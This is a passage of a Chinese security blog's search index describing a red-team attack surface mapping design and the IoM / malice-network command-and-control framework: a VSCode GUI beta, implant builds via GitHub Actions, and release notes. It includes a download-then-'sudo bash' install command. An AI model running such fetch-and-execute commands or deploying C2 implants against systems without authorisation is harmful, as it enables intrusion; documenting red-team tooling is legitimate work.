(\u4e3b\u52a8\u7684dns\u4fe1\u606f\u6536\u96c6)</li> <li>subfinder (\u88ab\u52a8\u5b50\u57df\u540d\u6536\u96c6)</li> <li>nuclei (\u6f0f\u6d1e\u626b\u63cf)</li> <li>katago (headless\u722c\u866b)</li> </ul>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#\u4e3a\u4ec0\u4e48\u8981\u4fdd\u7559projectdiscovery\u7684\u5de5\u5177\u94fe","title":"\u4e3a\u4ec0\u4e48\u8981\u4fdd\u7559projectdiscovery\u7684\u5de5\u5177\u94fe","text":"<ol> <li>\u6781\u5176\u6d3b\u8dc3\u7684\u793e\u533a, \u9664\u4e86\u90a3\u51e0\u4e2a\u6548\u7387\u975e\u5e38\u9ad8\u7684\u6838\u5fc3\u5f00\u53d1\u8005\u5916, \u8fd8\u6709\u4e00\u4e2a\u6d3b\u8dc3\u7684\u793e\u533a, \u6bcf\u5929\u90fd\u6709\u6570\u5341\u4e2aissue\u88ab\u5904\u7406, pr\u88ab\u5408\u5e76. \u6211\u66fe\u7ecf\u63d0\u4ea4\u4e86\u51e0\u4e2apr, \u9879\u76ee\u7684\u8d1f\u8d23\u4eba\u5f88\u5feb\u4e0e\u6211\u5bf9\u63a5\u4e86\u9700\u6c42, \u8fdb\u884creview, \u4fee\u6539\u6574\u7406\u540e\u5408\u5e76.</li> <li>\u4f18\u96c5\u4e14\u7edf\u4e00\u7684\u547d\u4ee4\u884cUI, \u7279\u522b\u662f\u5728\u8f93\u5165\u8f93\u51fa\u4e0a\u57fa\u672c\u505a\u5230\u4e86\u7edf\u4e00, \u5927\u5927\u51cf\u5c11\u5b66\u4e60\u6210\u672c.</li> <li>\u8db3\u591f\u7684\u53ef\u62d3\u5c55\u6027, \u6211\u5728\u7ed9pd\u63d0\u4ea4pr\u6216\u8005\u4e8c\u5f00\u7684\u65f6\u5019, \u603b\u80fd\u611f\u53d7\u5230pd\u5f00\u53d1\u8005\u7684\u8003\u8651\u5145\u5206, \u51cf\u5c11\u4e86\u5f88\u591a\u9ebb\u70e6.</li> </ol> <p>\u56e0\u4e3a\u8fd9\u51e0\u70b9, \u8ba9pd\u7684\u5de5\u5177\u94fe\u5c31\u7b97\u6709\u4e00\u4e9b\u4e0d\u8db3, \u4e5f\u80fd\u901a\u8fc7\u81ea\u884c\u5b9e\u73b0\u6211\u7684\u9700\u6c42, \u5e76\u4e14\u8fd8\u80fd\u56de\u9988\u793e\u533a. \u56e0\u6b64, \u6211\u4eec\u51b3\u5b9a, \u5c06\u4fdd\u7559\u7edd\u5927\u90e8\u5206pd\u7684\u5de5\u5177\u94fe, \u4f8b\u5982 nuclei, subfinder, httpx, dnsx\u7b49\u7b49\u4e00\u7cfb\u5217\u5de5\u5177.</p> <p>pd\u7684\u8fd9\u4e9b\u4f18\u70b9\u4e5f\u4f1a\u5c3d\u91cf\u5728\u6211\u4eec\u81ea\u884c\u7814\u53d1\u7684\u5de5\u5177\u94fe\u4e2d\u7ee7\u627f.</p>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#kindred-\u7ec8\u6781\u76ee\u6807","title":"Kindred (\u7ec8\u6781\u76ee\u6807)","text":"<p>\u6211\u4eec\u6253\u7b97\u4f7f\u7528\u8fd9\u5957\u5de5\u4ef6\u5b9e\u73b0\u7684\u7b2c\u4e00\u4e2a\u4f7f\u7528\u573a\u666f\u5c31\u662f\u9762\u5411\u7ea2\u961f\u7684\u653b\u51fb\u9762\u7ba1\u7406(ASM), \u6682\u5b9a\u547d\u540d\u4e3akindred-project, \u662flol\u82f1\u96c4\u7684\u540d\u5b57, \u4e5f\u662f\u6211\u4e4b\u524d\u73a9lol\u65f6\u7684\u7edd\u6d3b --- \u6c38\u730e\u53cc\u5b50 lol.</p> <p>\u8fd9\u5c06\u662f\u4e00\u4e2a\u4ee5\u653b\u51fb\u65b9\u89c6\u89d2, \u540c\u65f6\u5bf9\u5185\u7f51, \u5916\u7f51, \u5f00\u6e90\u60c5\u62a5\u7684\u6d4b\u7ed8\u7cfb\u7edf, \u6709\u8bb8\u591a\u60f3\u6cd5\u662f\u4e4b\u524d\u4ece\u672a\u6709\u4eba\u5b9e\u8df5\u7684.</p> <p>\u5de5\u4ef6\u5316\u6a21\u5757\u5316\u7684\u8bbe\u8ba1\u601d\u8def\u4e0b,  \u5404\u4e2a\u5de5\u4ef6\u90fd\u80fd\u591f\u72ec\u7acb\u4f7f\u7528, \u800c\u5c06\u5176\u7ec4\u5408\u7f16\u6392\u8d77\u6765\u7684\u6846\u67b6, \u8fd9\u4e2a\u6846\u67b6\u5c31\u662fkindred\u7684\u672c\u4f53. \u8fd9\u90e8\u5206\u8bbe\u8ba1\u8f83\u4e3a\u590d\u6742, \u5de5\u7a0b\u91cf\u8f83\u5927, api\u51e0\u5929\u4e00\u6539, \u56e0\u6b64\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u5185\u90fd\u4e0d\u4f1a\u5f00\u6e90, \u77ed\u65f6\u95f4\u5185\u53ef\u80fd\u53ea\u4f1a\u5f00\u653e\u8bd5\u7528.</p> <p>\u76ee\u524d\u7684\u72b6\u6001\u662f\u5df2\u7ecf\u5b8c\u6210\u4e86\u4e00\u4e2ademo, \u5927\u6982\u662f\u4e00\u4e2aapi(\u8c03\u5ea6\u63a5\u53e3), cli(\u7528\u6237\u4ea4\u4e92), core(\u6570\u636e\u5904\u7406\u4e0e\u5206\u6790)\u8fd9\u6837\u7684\u7ed3\u6784, \u540e\u7eed\u5c06\u4f1a\u4ececore\u4e2d\u62c6\u51fa\u4e00\u4e2aengine(\u7f16\u6392\u8c03\u5ea6).</p> <p>\u56e0\u4e3a\u6ca1\u6709\u524d\u7aef, \u4e34\u65f6\u4f7f\u7528\u4e86neo4j browser\u4f5c\u4e3a\u76ee\u524d\u624b\u52a8\u6570\u636e\u5904\u7406\u7684UI, \u751f\u6210\u7684\u653b\u51fb\u9762\u62d3\u6251\u56fe\u6548\u679c\u662f\u8fd9\u6837\u7684. \u5f53\u7136\u8fd9\u4e2a\u56fe\u5e76\u4e0d\u662f\u6700\u7ec8\u7684\u7ed3\u679c, \u8fd8\u9700\u8981\u5927\u91cf\u7684\u6570\u636e\u5206\u6790\u4e0e\u5904\u7406\u5de5\u4f5c, \u624d\u80fd\u628a\u7ea2\u961f\u60f3\u8981\u7684\u6570\u636e\u63d0\u53d6\u51fa\u6765.</p> <p></p> <p>\u6211\u4eec\u91c7\u7528\u4e86neo4j(\u56fe\u6570\u636e\u5e93) \u76f4\u63a5\u4f5c\u4e3a\u6570\u636e\u5904\u7406\u5206\u6790\u7684\u6838\u5fc3, \u800c\u975e\u5c06\u5143\u6570\u636e\u5b58\u5728\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e2d, \u7136\u540e\u901a\u8fc7\u56fe\u6570\u636e\u5e93\u6e32\u67d3.  \u56e0\u4e3a\u6211\u4eec\u8ba4\u4e3a\u56fe\u6570\u636e\u5929\u7136\u5951\u5408\u4fe1\u606f\u6536\u96c6\u573a\u666f, \u5404\u79cd\u8d44\u4ea7\u4fe1\u606f\u4e0e\u4fe1\u606f\u4e4b\u95f4\u7684\u5173\u8054\u5c31\u6784\u6210\u4e86\u653b\u51fb\u9762, \u5bf9\u5176\u8fdb\u884c\u7ed8\u5236\u6700\u76f4\u89c2\u7684\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u4e00\u5f20\u56fe.  \u7ed8\u5236\u5b8c\u8fd9\u5f20\u56fe\u540e, \u518d\u5bf9\u5176\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u4e8c\u6b21\u5206\u6790\u5904\u7406, \u4ee5\u53ca\u540e\u7eed\u590d\u6d4b, \u957f\u671f\u76d1\u63a7, \u6f0f\u6d1e\u7ba1\u7406\u7b49\u90fd\u662f\u6c34\u5230\u6e20\u6210\u7684\u5185\u5728\u80fd\u529b.</p> <p>\u5728\u5206\u5e03\u5f0f\u4e0a, \u6211\u4eec\u91c7\u7528\u4e86\u4e91\u51fd\u6570\u7684\u65b9\u5f0f, \u8ba9\u4e2a\u4eba\u4e5f\u80fd\u591f\u90e8\u7f72\u4e00\u4e2a\u5e9e\u5927\u7684\u96c6\u7fa4, \u5e76\u901a\u8fc7\u517c\u5bb9\u5404\u7c7b\u4e91\u51fd\u6570\u670d\u52a1\u63d0\u4f9b\u5546, \u6784\u9020\u8d77\u4e00\u4e2a\u8de8\u56fd\u8de8\u670d\u52a1\u5546\u7684\u5206\u5e03\u5f0f\u8282\u70b9\u7f51\u7edc. \u6211\u4e2a\u4eba\u4f7f\u7528\u4e0b\u6765, \u6210\u672c\u975e\u5e38\u4f4e, \u4e00\u4e2a\u6708\u53ea\u9700\u8981\u51e0\u5341\u5757\u7684\u8d39\u7528. \u4e3a\u4e86\u5b9e\u73b0\u8fd9\u79cd\u5206\u5e03\u5f0f,  \u6211\u7f16\u5199\u4e86meta-matrix\u6846\u67b6, \u53ef\u4ee5\u5c06\u4e00\u4e2a\u5de5\u4ef6\u5feb\u901f\u90e8\u7f72\u5230\u4e91\u51fd\u6570, \u968f\u7528\u968f\u53d6, \u5f39\u6027\u4f7f\u7528.  </p> <p>\u66f4\u591a\u7684\u8bbe\u8ba1\u601d\u8def\u7ec6\u8282, \u5c06\u4f1a\u5728\u540e\u7eed\u7684\u6587\u7ae0\u4ecb\u7ecd.</p>"},{"location":"blog/2022/11/15/asm%E7%9A%84%E8%93%9D%E5%9B%BE/#\u7ed3\u8bed","title":"\u7ed3\u8bed","text":"<p>\u6211\u4eec\u5c06\u6beb\u65e0\u4fdd\u7559\u7684\u516c\u5f00\u6211\u4eec\u7684\u8bbe\u8ba1\u7406\u5ff5\u4e0e\u5404\u79cd\u5b9e\u8df5\u4e2d\u79ef\u7d2f\u7684\u7ecf\u9a8c, \u4e5f\u6b22\u8fce\u793e\u533a\u63d0\u4f9b\u66f4\u591a\u7684\u610f\u89c1, \u7ecf\u9a8c\u4ee5\u53capr. \u6240\u6709\u7684\u5de5\u5177\u94fe\u6211\u4eec\u90fd\u5c06\u5f00\u6e90, \u4f46\u56e0\u4e3a\u4e3b\u4e1a\u662f\u7ea2\u961f, \u5e76\u4e0d\u80fd\u5168\u8eab\u5fc3\u6295\u5165\u5230\u5f00\u53d1\u4e2d, \u6709\u4e9b\u529f\u80fd\u77ed\u671f\u5185\u65e0\u6cd5\u5b8c\u6210. \u867d\u7136kindred\u5728\u8fd1\u671f\u5185\u4e0d\u80fd\u5f00\u653e, \u4f46\u662f\u76f8\u5173\u7684\u5de5\u5177\u94fe\u5c06\u4f1a\u5728\u8fd9\u51e0\u4e2a\u6708\u9646\u7eed\u516c\u5f00.</p> <p>\u76ee\u524d\u4e5f\u6709\u4e0d\u5c11\u4e0e\u6211\u4eec\u60f3\u6cd5\u6709\u91cd\u5408\u7684\u521b\u4e1a\u516c\u53f8, \u4f46\u6211\u4eec\u5c06\u4f1a\u4fdd\u6301\u5f00\u6e90, \u4e3a\u793e\u533a\u63d0\u4f9b\u4e00\u4e2a\u5f00\u6e90\u7684\u9009\u9879, \u4e0d\u8fc7\u4e3a\u4e86\u907f\u514d\u6709\u53ef\u80fd\u7684\u51b2\u7a81, \u6211\u4eec\u7684\u5f00\u6e90\u534f\u8bae\u4e0d\u4f1a\u9009\u62e9\u5546\u4e1a\u5316\u53cb\u597d\u7684\u534f\u8bae, \u53ea\u5bf9\u4e2a\u4eba\u4f7f\u7528\u8005\u4fdd\u6301\u5b8c\u5168\u7684\u5f00\u653e.</p> <p>\u90e8\u5206\u5de5\u5177\u6b63\u5728\u5f00\u53d1\u4e2d, \u975e\u5e38\u591a\u529f\u80fd\u6ca1\u6709\u5b9e\u73b0, \u4e5f\u9700\u8981\u5145\u5206\u7684\u6d4b\u8bd5\u624d\u80fd\u516c\u5f00, \u6240\u4ee5\u6682\u65f6\u53ea\u5bf9\u8d21\u732e\u8005\u5f00\u653e\u8bd5\u7528.</p> <p>\u63a5\u4e0b\u6765\u51e0\u5929, \u6211\u4eec\u5c06\u4f1a\u53d1\u5e03\u4e00\u90e8\u5206\u81ea\u8ba4\u4e3a\u5df2\u7ecf\u76f8\u5bf9\u6210\u719f\u7684\u5de5\u4ef6, \u5e76\u4ecb\u7ecd\u8bbe\u8ba1\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u5947\u601d\u5999\u60f3\u4e0e\u5b9e\u6218\u4e2d\u9762\u4e34\u7684\u95ee\u9898.</p> <p>\u672c\u8d26\u53f7\u540e\u7eed\u7684\u5185\u5bb9\u4f1a\u76f8\u5bf9\u786c\u6838, \u4e3b\u8981\u5173\u4e8e\u8bbe\u8ba1\u601d\u8def\u4e0e\u7ecf\u9a8c\u7684\u81ea\u52a8\u5316.</p>"},{"location":"blog/2025/02/26/IoM_GUI/","title":"IoM GUI \u5185\u6d4b\u62db\u52df","text":""},{"location":"blog/2025/02/26/IoM_GUI/#intro","title":"Intro","text":"<p>IoM \u7684v0.1.0 \u7684\u5f00\u53d1\u5de5\u4f5c\u8fd8\u9700\u8981\u4e00\u6bb5\u65f6\u95f4\uff0c \u4f46GUI\u5df2\u7ecf\u5f00\u542f\u4e86\u62a2\u5148\u6d4b\u8bd5. \u6d4b\u8bd5\u4e0d\u9650\u540d\u989d\uff0c \u53d1\u5e03\u5728 https://github.com/chainreactors/malice-network/releases/tag/nightly</p> <p>\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u5b89\u88c5\u6d41\u7a0b\u5b89\u88c5GUI.</p> <p>IoM-GUI\u91c7\u7528vscode extension\u7684\u5f62\u5f0f\u5b9e\u73b0\uff0c \u4e0d\u662f\u4f20\u7edf\u7684GUI client\uff0c \u4e5f\u4e0d\u662fWEB GUI\u3002 \u6211\u4eec\u5c1d\u8bd5\u4e86\u4e00\u79cd\u524d\u6240\u672a\u6709\u7684C2 GUI\u5f62\u5f0f\uff0c \u539f\u56e0\u6709\u5f88\u591a: </p> <ul> <li>vscode \u5df2\u7ecf\u662f\u76ee\u524d\u73b0\u4ee3\u5316\uff0c\u517c\u5bb9\u6700\u591a\u573a\u666f\u7684IDE, \u5b83\u63d0\u4f9b\u7684\u57fa\u5ea7\u8ba9\u6211\u4eec\u80fd\u81ea\u7136\u800c\u7136\u7684\u5b9e\u73b0\u8de8\u5c4f\u4e0e\u5404\u7c7b\u573a\u666f\u8986\u76d6</li> <li>vscode \u96c6\u6210\u4e86\u6587\u4ef6\u6d4f\u89c8\uff0c\u7ec8\u7aef\uff0c\u8fdc\u7a0b\u5f00\u53d1\uff0c\u4ee3\u7406\u7b49\u7b49\u529f\u80fd\uff0c \u800cC2\u4e5f\u6709\u8fd9\u4e9b\u529f\u80fd\uff0c\u53ef\u4ee5\u76f4\u63a5\u63a5\u5165\u5230vscode\u5b9e\u73b0\u65e0\u7f1d\u7684\u4ea4\u4e92</li> <li>vscode\u672c\u8eab\u5c31\u662fIDE\uff0c \u53ef\u4ee5\u8fdb\u884c\u4e8c\u6b21\u5f00\u53d1\uff0c \u63d2\u4ef6\u5f00\u53d1\u7b49\uff0c \u53ef\u4ee5\u8ba9\u5f00\u53d1\u4e0e\u540e\u6e17\u900f\u65e0\u7f1d\u8fdb\u884c</li> <li>vscode \u63d0\u4f9b\u4e86\u6700\u4f18\u79c0\u7684AI\u96c6\u6210\uff0c\u540e\u7eed\u4f1a\u5c1d\u8bd5\u5c06AI\u63a5\u5165\u5230GUI\u7684\u5de5\u4f5c\u6d41\u4e2d</li> <li>......</li> </ul> <p>\u8981\u4ece\u96f6\u5b9e\u73b0\u4e00\u4e2aGUI\u5927\u6982\u7387\u4f1a\u5f88\u5e73\u5eb8\uff0c \u4f46\u662f\u6211\u4eec\u8ba1\u5212\u6700\u5927\u7a0b\u5ea6\u5229\u7528vscode\u7684\u5404\u79cd\u7279\u6027\uff0c\u6253\u9020\u4e00\u4e2a\u6700\u597d\u7528\u7684C2-GUI\u3002 </p> <p>\u8b66\u544a: </p> <p>\u76ee\u524d\u63d0\u4f9b\u7684\u7248\u672c\u662f\u65e9\u671f\u6d4b\u8bd5\u7248\uff0c\u6bcf\u5929\u90fd\u4f1a\u81ea\u52a8\u57fa\u4e8e\u6700\u65b0\u7684commit\u6253\u5305\uff0c\u662f\u6781\u4e0d\u7a33\u5b9a\u7684\u72b6\u6001</p> <p>\u6570\u636e\u548capi\u53ef\u80fd\u6bcf\u5929\u90fd\u4f1a\u6539\u53d8\uff0c\u5982\u679c\u7528\u4e8e\u751f\u4ea7\u73af\u5883\u8bf7\u4e09\u601d\u3002 </p> <p>\u6709\u4efb\u4f55\u5efa\u8bae\u548c\u53cd\u9988\uff0c \u6b22\u8fce\u5728 https://github.com/chainreactors/malice-network/issues \u4e2d\u6c9f\u901a</p> <p>\u6216\u901a\u8fc7wiki\u4e2d\u7684\u8054\u7cfb\u65b9\u5f0f\u53d1\u9001\u90ae\u4ef6\uff0c \u6211\u4f1a\u624b\u52a8\u62c9\u5165\u4ea4\u6d41\u7fa4</p>"},{"location":"blog/2025/02/26/IoM_GUI/#\u5b89\u88c5","title":"\u5b89\u88c5","text":""},{"location":"blog/2025/02/26/IoM_GUI/#\u4e0b\u8f7d\u6587\u4ef6","title":"\u4e0b\u8f7d\u6587\u4ef6","text":"<p>\u4ece malice-network\u4ed3\u5e93 \u4e2d\u7684nightly release\u4e2d\u4e0b\u8f7d\u5bf9\u5e94\u7684vscode\u63d2\u4ef6\u6587\u4ef6\u4ee5\u53caclient\u6587\u4ef6</p> <p></p>"},{"location":"blog/2025/02/26/IoM_GUI/#\u4ece\u6587\u4ef6\u5b89\u88c5vscode\u63d2\u4ef6","title":"\u4ece\u6587\u4ef6\u5b89\u88c5vscode\u63d2\u4ef6","text":"<p>\u6253\u5f00extension\u6216ctrl+sheft+x \u5e76\u5355\u51fb\u5982\u56fe\u6240\u793a</p> <p></p>"},{"location":"blog/2025/02/26/IoM_GUI/#\u914d\u7f6evscode\u63d2\u4ef6","title":"\u914d\u7f6eVSCODE\u63d2\u4ef6","text":"<p>IoM:\u00a0Executable Path \u586b\u5165\u4ecenightly release\u4e0b\u8f7d\u7684iom\u4e8c\u8fdb\u5236\u7a0b\u5e8f</p> <p></p>"},{"location":"blog/2025/02/26/IoM_GUI/#\u6253\u5f00iom-\u63d2\u4ef6","title":"\u6253\u5f00IoM \u63d2\u4ef6","text":"<p>IoM\u9700\u8981 malice-network\u751f\u6210\u7684.auth\u51ed\u8bc1, \u6240\u4ee5\u5728\u8fd9\u4e00\u6b65\u4e4b\u524d\u8bf7\u5148\u81ea\u884c\u642d\u5efa\u597dserver</p> <p>\u53ef\u4ee5\u53c2\u8003quickstart\u6587\u6863\u5feb\u901f\u642d\u5efaserver</p> <p>\u5b89\u88c5server\u7684\u547d\u4ee4\u9700\u8981\u4fee\u6539\u4e3a: <pre><code>curl -L \"https://raw.githubusercontent.com/chainreactors/malice-network/master/install.sh\" -o install.sh\nsudo MALICE_NETWORK=nightly bash install.sh\n</code></pre></p> <p></p> <p>\u5982\u679c\u5df2\u7ecf\u901a\u8fc7client\u8fde\u63a5\u8fc7server\uff0c \u5219\u4f1a\u76f4\u63a5\u663e\u793a\u5386\u53f2\u8fde\u63a5\u8fc7\u7684auth\u6587\u4ef6. \u5355\u51fb\u5373\u53ef\u8fdb\u5165\u5230\u4ea4\u4e92\u754c\u9762. </p> <p>\u8bf7\u6ce8\u610fserver\u7248\u672c,client\u7248\u672c,gui\u7248\u672c\u4e00\u81f4</p> <p></p>"},{"location":"blog/2025/02/26/IoM_GUI/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<p>GUI\u8fd8\u672a\u5b8c\u5168\u5b9e\u73b0client\u7684\u5168\u90e8\u529f\u80fd, \u76ee\u524d\u53ea\u5b9e\u73b0\u4e86\u8f83\u4e3a\u91cd\u8981\u7684\u529f\u80fd. \u5e76\u4e14\u5728\u5f88\u591a\u4ea4\u4e92\u4e0a\u8fd8\u7f3a\u4e4f\u8054\u52a8\uff0c\u5b58\u5728bug\u7b49\u7b49\u95ee\u9898\u3002 \u8bf7\u89c1\u8c05</p> <p>\u5982\u679c\u6709\u4efb\u4f55\u7528\u6237\u4f53\u9a8c, bug, \u5efa\u8bae\uff0c \u6b22\u8fce\u63d0\u4f9bissue\u3002 \u6211\u4eec\u4f1a\u5c3d\u5feb\u5904\u7406\u3002</p>"},{"location":"blog/2025/02/26/IoM_GUI/#\u914d\u7f6egithub-action\u7f16\u8bd1","title":"\u914d\u7f6egithub action\u7f16\u8bd1","text":"<p>IoM\u652f\u6301\u901a\u8fc7github action\u4e0a\u51c6\u5907\u597d\u7684\u7f16\u8bd1\u73af\u5883\u81ea\u52a8\u5316\u7f16\u8bd1</p> <p>fork https://github.com/chainreactors/malefic</p> <p>\u70b9\u51fb\u7533\u8bf7github token \uff0c \u9700\u8981\u6709\u4ee5\u4e0b\u6743\u9650</p> <p></p> <p>\u5728\u8bbe\u7f6e\u4e2d\u641c\u7d22iom</p> <p></p> <p>\u8fd9\u91cc\u7684\u53c2\u6570\u586b\u5199fork\u540e\u7684\u4ed3\u5e93\u6240\u6709\u8005\u548c\u4ed3\u5e93\u540d\uff0c \u4ee5\u53ca\u521a\u521a\u7533\u8bf7\u7684github token</p> <p>\u8fde\u63a5\u4efb\u610f\u670d\u52a1\u5668\uff0c \u70b9\u51fb<code>Artifacts</code> \u53d1\u73b0github\u53d8\u4e3a\u7eff\u70b9\u8868\u793agithub action \u81ea\u52a8\u7f16\u8bd1\u5df2\u6b63\u786e\u542f\u7528\uff0c\u70b9\u51fbAdd Profile\u5373\u53ef\u751f\u6210implant\u7f16\u8bd1\u4efb\u52a1 </p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/","title":"IoM v0.0.2 the real beginning","text":"<p>v0.0.2 \u662f\u4e00\u6b21\u5de8\u5927\u7684\u6539\u52a8. \u5728\u4ed3\u4fc3\u53d1\u5e03v0.0.1\u540e, \u6211\u4eec\u540c\u65f6\u5bf9server/client/listener/implant\u90fd\u5f00\u59cb\u4e86\u91cd\u6784. \u91cd\u6784\u5de5\u7a0b\u7684\u4ee3\u7801\u91cf\u63a5\u8fd120000\u884c, \u662f\u539f\u672c\u4ee3\u7801\u7684\u4e00\u534a. </p> <p>\u597d\u5728\u8fd9\u4e48\u5927\u89c4\u6a21\u7684\u6539\u52a8, \u4e5f\u5e26\u6765\u4e86\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347. </p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#malice-network-\u66f4\u65b0","title":"malice-network \u66f4\u65b0","text":""},{"location":"blog/2024/09/23/IoM_v0.0.2/#client-\u91cd\u6784","title":"client \u91cd\u6784","text":"<p>\u672c\u6b21\u66f4\u65b0\u4e2d, \u7edd\u5927\u90e8\u5206\u4fee\u6539\u90fd\u662f\u4e3a\u4e86\u63d0\u4f9b\u4e00\u4e2a\u66f4\u5f3a\u5927\uff0c\u66f4\u7f8e\u89c2\uff0c \u66f4\u7b80\u4fbf\u7684client. \u4e5f\u662f\u4e3a\u4e86\u540e\u7eedGUI\u6253\u4e0b\u57fa\u7840. </p> <p>\u6211\u4eec\u5e26\u6765\u4e86\u5168\u65b0\u7684client, \u66f4\u4f18\u96c5\u7684\u547d\u4ee4\u8865\u5168, \u63d0\u793a\u4e0e\u5c55\u793a</p> <p></p> <p>\u65b0\u7684usage \u6e32\u67d3</p> <p></p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#\u91cd\u6784aliasextension","title":"\u91cd\u6784alias/extension","text":"<p>\u5728sliver\u4e2d, alias\u4e0eextension\u662f\u4ee3\u8868\u4e2d\u539f\u7406\u4e0d\u540c, \u5b8c\u5168\u4e0d\u540c\u7684\u6267\u884c\u65b9\u5f0f. alias\u53ea\u662f\u672c\u5730\u7684\u547d\u4ee4\u884c\u522b\u540d, extension\u5219\u4f1a\u52a0\u8f7d\u5230implant\u5185\u5b58\u4e2d. </p> <p>\u5bf9\u4e8eIoM \u8fd9\u4e24\u8005\u5e76\u65e0\u533a\u522b, IoM\u5df2\u7ecf\u5b9e\u73b0\u4e86\u9700\u8981\u52a0\u8f7d\u7684\u73af\u5883, \u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4e0d\u540c\u683c\u5f0f\u7684\u63d2\u4ef6. \u6240\u4ee5\u5728IoM\u65b0\u7684client\u4e2d, \u6211\u4eec\u4e0d\u5728\u533a\u5206\u8fd9\u4e24\u8005(\u5728\u7ba1\u7406\u547d\u4ee4\u4e0a\u6709\u533a\u5206 ,\u5728\u4f7f\u7528\u65f6\u65e0\u533a\u5206). \u53ef\u4ee5\u65e0\u7f1d\u6267\u884c\u6240\u6709\u7684armory\u4e2d\u7684\u63d2\u4ef6. </p> <p></p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#notify","title":"notify","text":"<p>IoM\u73b0\u5728\u539f\u751f\u652f\u6301\u7b2c\u4e09\u65b9\u5e94\u7528\u7684\u901a\u77e5.  \u76ee\u524d\u6211\u4eec\u652f\u6301\u4e86 telegram, \u9489\u9489, \u98de\u4e66\u4e0echannel\u9171\u56db\u79cd\u5e38\u7528\u7684\u65b9\u5f0f. </p> <p>\u5173\u4e8esession\u4e0a\u7ebf, listener, pipeline, website\u7684\u64cd\u4f5c\u5c06\u81ea\u52a8\u53d1\u9001\u5230\u914d\u7f6e\u4e86\u7684\u901a\u77e5\u5e94\u7528\u4e2d. </p> <p></p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#pipelinewebsite","title":"pipeline/website","text":"<p>v0.0.1\u7684pipeline\u4e0ewebsite\u547d\u4ee4\u8bbe\u8ba1\u5b58\u5728\u95ee\u9898, \u5e76\u4e14\u5b58\u5728\u591a\u4e2abug. v0.0.2\u91cd\u6784\u4e86\u8fd9\u4e24\u4e2a\u547d\u4ee4\u91cd\u65b0\u4e0a\u7ebf. </p> <p>\u73b0\u5728\u7684client\u53ef\u4ee5\u63a7\u5236listener\u5feb\u901f\u6253\u5f00\u4e00\u4e2a\u65b0\u7684pipeline\u6216website, \u5e76\u5b9e\u73b0\u4e86\u81ea\u52a8\u5316\u7684\u8bc1\u4e66\u751f\u6210\u4e0e\u7ba1\u7406.</p> <p></p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#server","title":"server","text":""},{"location":"blog/2024/09/23/IoM_v0.0.2/#\u5408\u5e76\u4e86listener\u4e0eserver","title":"\u5408\u5e76\u4e86listener\u4e0eserver","text":"<p>\u539f\u672c\u7684listener\u4e0eserver\u72ec\u7acb\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u65b9\u5f0f\u5728\u90e8\u7f72\u4e0a\u5e26\u6765\u7684\u4e0d\u5c11\u7684\u6df7\u6dc6, \u9700\u8981\u540c\u65f6\u7ba1\u7406\u4e24\u5957\u914d\u7f6e\u6587\u4ef6\u4e0e\u4e8c\u8fdb\u5236\u6587\u4ef6.</p> <p>\u6211\u4eec\u63a5\u53d7\u7528\u6237\u7684\u53cd\u9988, \u7b80\u5316\u4e86\u8fd9\u4e2a\u6b65\u9aa4, \u73b0\u5728\u4e0d\u533a\u5206server\u4e0elistener\u4e8c\u8fdb\u5236\u6587\u4ef6. \u4e5f\u4e0d\u533a\u5206server\u4e0elistener\u7684\u914d\u7f6e\u6587\u4ef6. \u53ea\u9700\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6, \u5c06\u5bf9\u5e94\u7684<code>enable</code>\u8bbe\u7f6e\u4e3atrue, \u5373\u53ef\u81ea\u52a8\u8bc6\u522b\u4e3aserver. \u540c\u6837\u4e5f\u652f\u6301\u540c\u65f6\u90e8\u7f72server\u4e0elistener.</p> <pre><code>server:  \n  enable: true  \n  grpc_port: 5004  \n  grpc_host: 0.0.0.0  \n  ip: 127.0.0.1  \nlisteners:  \n  name: listener  \n  auth: listener.auth  \n  enable: true  \n  tcp:  \n    - name: tcp_default  \n      port: 5001  \n      host: 0.0.0.0  \n      protocol: tcp  \n      enable: true  \n</code></pre>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#\u652f\u6301crtm","title":"\u652f\u6301crtm","text":"<p>\u5728crtm\u4e2d\u652f\u6301\u4e86iom(client) \u4e0emalice-network(server/listener) \u7684\u5b89\u88c5\u4e0e\u7ba1\u7406</p> <p></p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#lua\u63d2\u4ef6\u7cfb\u7edf","title":"lua\u63d2\u4ef6\u7cfb\u7edf","text":"<p>\u5728\u7b2c\u4e00\u4e2a\u7248\u672c\u4e2d, IoM\u5c1d\u8bd5\u517c\u5bb9\u4e86sliver\u7684armory\u6b66\u5668\u5e93. sliver\u6709\u4e24\u7c7b\u63d2\u4ef6, \u5206\u522b\u662falias\u4e0eextension. \u90fd\u662f\u901a\u8fc7json\u5b9a\u4e49\u7684manifest, \u6ce8\u518c\u5bf9\u5e94\u7684command. \u8fd9\u786e\u5b9e\u662f\u4e2a\u975e\u5e38\u7b80\u6d01\u7684\u529e\u6cd5, \u4f46\u4e5f\u610f\u5473\u7740sliver\u7684\u62d3\u5c55\u65b9\u9762\u7684\u8868\u73b0\u529b\u8fdc\u8fdc\u5f31\u4e8ecobaltstrike. \u6211\u4eec\u505a\u80fd\u7684, \u5c31\u662f\u628a\u4e00\u4e9b\u653b\u51fb\u7684\u53c2\u6570\u56fa\u5b9a\u4e0b\u6765. </p> <p>\u73b0\u5728IoM\u5728client\u4e2d\u52a0\u5165\u4e86\u80fd\u52a8\u6001\u6ce8\u518c\u547d\u4ee4, \u6dfb\u52a0\u529f\u80fd\u7684lua\u63d2\u4ef6. 